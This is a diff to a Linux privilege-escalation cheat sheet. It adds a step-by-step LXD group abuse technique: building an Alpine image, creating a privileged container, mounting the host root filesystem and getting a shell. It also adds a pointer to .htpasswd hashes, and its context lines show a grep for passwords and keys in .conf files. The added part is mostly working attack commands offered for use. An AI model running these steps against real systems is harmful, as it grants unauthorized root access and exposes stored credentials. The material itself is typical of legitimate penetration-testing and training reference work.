@@ -864,6 +864,10 @@ Enumerate .conf files:
 find / -name '*.conf' -type f 2>/dev/null | xargs grep -i -E "username|password|key|database" 2>/dev/null
 ```
 
+#### .htpasswd
+
+The `.htpasswd` may contain a password hash. It is often located in the webroot directory.
+
 ### History Files
 
 Users' commands are recorded in history files when they are using specific programs. When a user types a password as part of a command, it may be saved in the history file. Switching to the root account with a found password is always a good idea.
@@ -1475,6 +1479,59 @@ whoami
 
 # Expected Output
 root
+```
+
+###  LXC/LXD
+
+#### LXD Abuse
+
+Enumerate the group of the current user:
+
+```bash
+groups
+# output
+lxd
+```
+
+The lxd \(Linux Daemon\) is a system container manager, that controls lxc \(Linux Container\). Linux Container \(LXC\) is a virtualization technology that runs isolated containers using a single Linux kernel. It is possible for the user ash to create a privileged container and then use it to mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it to the remote machine. Let's download and build the image locally. The image can be found here.
+
+```bash
+git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder/
+./build-alpine
+```
+
+A compressed file alpine-\*\*\*\*\*\*\*\*.tar.gz is created. Then download the file to the target machine. On the remote machine, run the following to initiate lxd, inputting no to all prompts.
+
+```bash
+lxd init
+```
+
+Next, we run the following command to import the alpine image.
+
+```bash
+lxc image import ./alpine-v3.12-x86_64-20201106_2000.tar.gz --alias alpine
+```
+
+To check if the image is successfully imported, type the following.
+
+```bash
+lxc image list
+```
+
+Next, we need to make the container privileged, and mount the filesystem, before starting the container.
+
+```bash
+lxc init alpine mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root
+recursive=true
+lxc start mycontainer
+```
+
+Once the container is started, we can access it by typing the following command.
+
+```bash
+lxc exec mycontainer /bin/sh
 ```
 
 ## Network
